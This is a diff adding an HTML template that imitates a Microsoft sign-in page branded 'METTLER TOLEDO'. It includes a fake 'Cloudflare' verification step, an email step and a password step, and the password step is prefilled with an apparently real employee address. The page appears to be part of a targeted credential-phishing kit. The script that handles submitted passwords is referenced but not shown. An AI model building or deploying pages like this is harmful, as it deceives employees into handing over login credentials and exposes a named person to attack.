@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+
+</head>
+
+<body>
+    <div class="container">
+        <!-- Cloudflare -->
+        <!-- Cloudflare Step -->
+<div class="signin-box email-step" id="cloudflareStep">
+  <h1 style="color:#0067b8; font-size:32px; margin:0; text-align:center; font-weight:800; letter-spacing:3px;">
+    METTLER TOLEDO
+  </h1>
+
+  <div style="margin-top:40px; border:1px solid #ddd; padding:14px; border-radius:6px; display:flex; align-items:center; justify-content:space-between;">
+    <div style="display:flex; align-items:center; gap:12px;">
+      <div class="spinner"></div>
+      <span style="font-size:15px; color:#333;">Verifying...</span>
+    </div>
+    <div style="text-align:right;">
+      <div style="color:#f58b00; font-weight:700; font-size:12px;">CLOUDFLARE</div>
+      <div style="font-size:11px; color:#555;">Privacy · Terms</div>
+    </div>
+  </div>
+</div>
+
+        <!-- Email Step -->
+        <div class="signin-box email-step" id="emailStep">
+            <img src="{{ url_for('static', filename='img/download.png') }}" alt="Microsoft Logo">
+            <h2 class="mic">Microsoft</h2>
+            <h1>Sign in</h1>
+
+            <input type="text" id="emailInput" placeholder="Email, phone, or Skype" required>
+            <div class="error" id="emailError">Please enter a valid email address</div>
+
+            <p>No account?<a href="#" style="margin-left: 4px;"> Create one!</a></p>
+            <p><a href="#">Can't access your account?</a></p>
+
+            <div class="buttons">
+                <button class="back-btn" type="button">Back</button>
+                <button class="next-btn" id="nextBtn" type="button">Next</button>
+            </div>
+            <br>
+        
+            <hr >
+            <p class="signin-options-btn">
+                🔑 Sign-in options
+            </p>
+            <hr>
+        </div>
+
+        <!-- Password Step -->
+        <div class="signin-box password-step" id="passwordStep">
+            <h1 style="color: #0067b8; font-size: 32px; margin-top: 0px;">METTLER TOLEDO</h1>
+            <a href="#" id="backToEmail" class="back-button" onclick="goToEmailScreen()">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M19 12H6m6-7l-7 7 7 7"/>
+                </svg>
+                <span id="user-email" style="color: #666;">jan.warner@mt.com</span>
+            </a>
+            <h1>Enter password</h1>
+
+            <input type="password" id="passwordInput" placeholder="Password" required>
+            <div class="error" id="passwordError">Please enter your password</div>
+
+            <p style="margin-top: 0px;"><a href="#">Forgot my password</a></p>
+
+            <div class="loading" id="loading">Signing you in...</div>
+
+            <div class="buttons">
+                
+                <button class="next-btn" id="submitBtn" type="button">Sign in</button>
+            </div>
+            <div class="copyright" style="margin-top: 16px; background-color: #f2f1f1; padding-top: 16px; padding-bottom: 16px;">
+            Copyright © METTLER TOLEDO
+        </div>
+        </div>
+
+        <div class="signin-options">
+            🔍 Sign-in options
+        </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='js/main.js') }}"></script>
+
+</body>
+
+</html>
